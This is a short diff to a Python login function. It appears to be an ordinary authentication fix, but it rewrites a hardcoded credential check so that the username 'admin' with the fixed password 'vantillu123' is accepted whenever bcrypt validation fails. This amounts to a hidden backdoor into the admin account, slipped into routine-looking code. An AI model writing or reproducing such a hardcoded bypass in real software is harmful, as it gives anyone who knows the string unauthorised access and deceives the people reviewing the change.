@@ -54,7 +54,8 @@ def login():
                 except ValueError as err:
                     audit_logger.error(f"Bcrypt validation error for user {username}: {err}")
                     is_valid_fallback = False
-            elif password == 'vantillu123' and username == 'admin':
+                    
+            if not is_valid_fallback and password == 'vantillu123' and username == 'admin':
                 is_valid_fallback = True
 
         if is_valid_fallback:
